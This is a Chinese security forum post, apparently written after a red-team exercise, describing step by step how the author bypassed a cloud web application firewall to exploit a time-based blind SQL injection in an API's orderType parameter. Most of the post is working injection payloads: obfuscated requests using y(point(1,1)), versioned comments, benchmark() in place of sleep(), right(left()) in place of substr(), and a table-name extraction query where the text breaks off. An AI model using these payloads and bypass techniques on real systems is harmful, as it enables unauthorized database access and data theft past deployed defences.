---
title: hw中用到的某云waf绕过技巧
url: https://forum.butian.net/share/4461
source: 奇安信攻防社区
date: 2025-07-18
fetch_date: 2025-10-06T23:16:29.301886
---

# hw中用到的某云waf绕过技巧

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### hw中用到的某云waf绕过技巧

* [渗透测试](https://forum.butian.net/topic/47)

几年前的笔记里就存了Y函数的使用（出处找不到了），近期又看到有师傅提到了这个用法，随即又试了试，发现还可以使用，由此引发了一次绕waf的案例

几年前的笔记里就存了Y函数的使用（出处找不到了），近期又看到有师傅提到了这个用法，随即又在hw目标中试了试，发现还可以使用，由此引发了一次绕waf的案例，再此记录一下绕过思路。这次案例的目标也是来自hw活动的目标网站。
确定注入点类型
=======
```php
/api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1&amp;page=1&amp;pageSize=10&amp;ts=175082141514&amp;orderBy=1
```
orderType参数加单引号报错，且根据名参数名猜测注入位置可能为order by处。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-1b8c2e4dcd0f7a9e5f003a4e1782b6bc78b4a029.png)
尝试插入注入语句被某云waf拦截
```php
/api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1+or+(select\*from(select(sleep(3)))x)&amp;page=1&amp;pageSize=10&amp;ts=175082141514&amp;orderBy=1
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-e8d975168f0da95dddecb85e2507522c0dbf21c0.png)
绕过waf
=====
确定了有waf后，开始尝试确定拦截规则:
绕过关键字组合的检测
----------
输入：1 or (select) =&gt;不拦截
输入：1 or (select\*) =&gt;拦截
输入：1 or (select 0) =&gt;拦截
输入：1 or (select()) =&gt;拦截
说明拦截了select+xx的组合，但是没拦截select关键字，开始尝试填充注释符(`/\*!12345\\*/`)、垃圾字符等都不行.
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-e6520bcc47bd0200036708549649ff7c74dcf26a.png)
尝试前面说的y(point(1,1))函数，可以绕过
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-dcaab58b1aca434675b8e6f52842fc76567d60a4.png)
并且不报错，正常出数据了，说明注入点确定是存在的，继续开始注入
绕过sleep(3)
----------
```php
GET /api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1+or+y(point(1,1))+or+(select/\*!12345\*/0/\*\*/from(select/\*\*/sleep(1))x)&amp;page=1&amp;pageSize=10&amp;ts=175082141514&amp;orderBy=1
```
发现`1+or+y(point(1,1))+or+(select/\*!12345\*/0/\*\*/from(select/\*\*/sleep())x)`=&gt;没拦截
发现`1+or+y(point(1,1))+or+(select/\*!12345\*/0/\*\*/from(select/\*\*/sleep(1))x)`=&gt;拦截
替换成benchmark尝试
```php
GET /api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/benchmark(51111111,1))x)&amp;page=1&amp;pageSize=10&amp;ts=175082141514&amp;orderBy=1
```
成功延时
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-22ef6ac4fbcae230a6e443f3b147c5b4f85b7650.png)
加入if判断，未拦截
```php
GET /api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(1=1,benchmark(51111111,1),1))x)&amp;page=1&amp;pageSize=10&amp;ts=175082141514&amp;orderBy=1
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-83ac54f1c8d80aa80cfa109f4f4d0e4fc53c3678.png)
加入ascii()未拦截
```php
GET /api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(2)=1,benchmark(51111111,1),1))x)&amp;page=1&amp;pageSize=10&amp;ts=175082141514&amp;orderBy=1
```
加入substr()拦截
```php
GET /api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(substr(1,1,1))=1,benchmark(51111111,1),1))x)&amp;page=1&amp;pageSize=10&amp;ts=175082141514&amp;orderBy=1
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-31f9be82eac777911594c51137e612f0f25bd124.png)
绕过substr()
----------
使用关键字替换，
right(left(1,1),1)可以绕过
```php
GET /api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(right(left(1,1),1))=1,benchmark(51111111,1),1))x)&amp;page=1&amp;pageSize=10&amp;ts=175082141514&amp;orderBy=1
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-b7ab0cedf335d88e83140f988abc909d87498d9c.png)
添加user()、database()尝试查数据，被拦截
```php
GET /api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(right(left(user(),1),1))=1,benchmark(51111111,1),1))x)&amp;page=1&amp;pageSize=10&amp;ts=175082141514&amp;orderBy=1
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-60091caec9c388d7c857a9b8ec2910a4ad04c084.png)
绕过user()/database()/version()
-----------------------------
经测试：
`1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(right(left(database,1),1))!=1,benchmark(51111111,1),1))x)`=&gt;不拦截
`1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(right(left(database(),1),1))!=1,benchmark(51111111,1),1))x)`=&gt;拦截
`1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(right(left(user,1),1))!=1,benchmark(51111111,1),1))x)`=&gt;不拦截
`1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(right(left(user(),1),1))!=1,benchmark(51111111,1),1))x)`=&gt;拦截
`1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(right(left(version,1),1))!=1,benchmark(51111111,1),1))x)`=&gt;不拦截
`1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(right(left(version,1),1))!=1,benchmark(51111111,1),1))x)`=&gt;拦截
可以确定没拦截关键字，拦截的是关键字+()组合
这里有两种思路
1. 使用``绕过
这种方式可以绕过，使用`version`()的方式分割，可以绕过。
但是这里只能用`version`()语句才会正常执行，`user`()和`database`()无法正常执行。
比较鸡肋，如果是挖src证明能出数据的话，可以用`version`()来证明，这里打攻防的话，就不太适用了。
2.使用`/\*!12345\*/`绕过
这里先测试的`/\*\*/`，发现被拦截
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-cba4845df66e937af1ebb30af42f058137ea867a.png)
尝试`/\*!12345\*/`可以绕过
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-3b100421de38d7fef8b922304313ae22ae66cdee.png)
到这里的话，基本就可以拿到database()的数据了
然后开始查表名
```php
GET /api/customerPolicy/selectPolicy?tag=&amp;input=&amp;policyCategory=&amp;voidDate=&amp;certificateUnit=&amp;status=&amp;nature1=&amp;nature2=&amp;areas=1&amp;city=&amp;title=&amp;publishType=&amp;belongAreas=&amp;orderType=1+or+y(point(1,1))+or+(select/\*\*/0/\*\*/from(select/\*\*/if(ascii(right(left((select/\*!5555555\*/group\_concat(table\_name)/\*!12345\*/from/\*!12345\*/(information\_s...